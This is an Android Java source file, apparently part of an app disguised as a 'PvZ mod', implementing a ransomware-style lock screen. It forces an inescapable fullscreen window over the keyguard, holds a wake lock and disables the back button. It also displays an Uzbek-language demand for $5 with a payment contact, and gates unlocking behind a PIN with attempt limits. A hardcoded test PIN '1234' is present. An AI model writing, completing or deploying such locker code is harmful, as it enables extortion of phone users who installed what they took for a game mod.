package com.pvzmod.vip;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.content.ContextCompat;

public class LockScreenActivity extends Activity {
    private EditText pinInput;
    private TextView ransomText, attemptsText;
    private Button unlockBtn;
    private PowerManager.WakeLock wakeLock;
    private int failedAttempts = 0;
    private static final String CORRECT_PIN = "1234"; // SHA256 later
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_lock);
        
        // FULLSCREEN INESCAPABLE LOCK
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                           WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                           WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                           WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                           WindowManager.LayoutParams.FLAG_FULLSCREEN |
                           WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN);
        
        initViews();
        acquireWakeLock();
        PinManager.loadAttempts();
        updateUI();
        
        pinInput.addTextChangedListener(new TextWatcher() {
            @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
            @Override public void onTextChanged(CharSequence s, int start, int before, int count) {}
            @Override
            public void afterTextChanged(Editable s) {
                if (s.length() == 4) checkPin(s.toString());
            }
        });
    }
    
    private void initViews() {
        pinInput = findViewById(R.id.pin_input);
        ransomText = findViewById(R.id.ransom_text);
        attemptsText = findViewById(R.id.attempts_text);
        unlockBtn = findViewById(R.id.unlock_btn);
        
        ransomText.setText("💰 5$ jo'natmasang telefon ochilmaydi!\nadmin@pentest.uz ga yuboring");
        unlockBtn.setOnClickListener(v -> checkPin(pinInput.getText().toString()));
    }
    
    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | 
                                PowerManager.ACQUIRE_CAUSES_WAKEUP |
                                PowerManager.ON_AFTER_RELEASE, "PvZ:Locker");
        wakeLock.acquire();
    }
    
    private void checkPin(String pin) {
        if (pin.equals(CORRECT_PIN)) {
            // TEMP UNLOCK (test)
            Toast.makeText(this, "Unlock (test)", Toast.LENGTH_SHORT).show();
            finish();
        } else {
            failedAttempts++;
            PinManager.saveAttempts(failedAttempts);
            
            if (failedAttempts >= 3) {
                long blockUntil = System.currentTimeMillis() + 60000; // 1min
                PinManager.blockUntil(blockUntil);
                pinInput.setEnabled(false);
                new Handler().postDelayed(() -> {
                    pinInput.setEnabled(true);
                    failedAttempts = 0;
                    PinManager.saveAttempts(0);
                    updateUI();
                }, 60000);
            }
            updateUI();
            pinInput.setText("");
        }
    }
    
    private void updateUI() {
        attemptsText.setText("Xatolar: " + failedAttempts + "/3");
        if (PinManager.isBlocked()) {
            attemptsText.setText("1 daqiqa bloklandi...");
        }
    }
    
    @Override
    protected void onDestroy() {
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        super.onDestroy();
    }
    
    @Override
    public void onBackPressed() {}
    @Override
    public void onWindowFocusChanged(boolean hasFocus) { super.onWindowFocusChanged(true); }
}
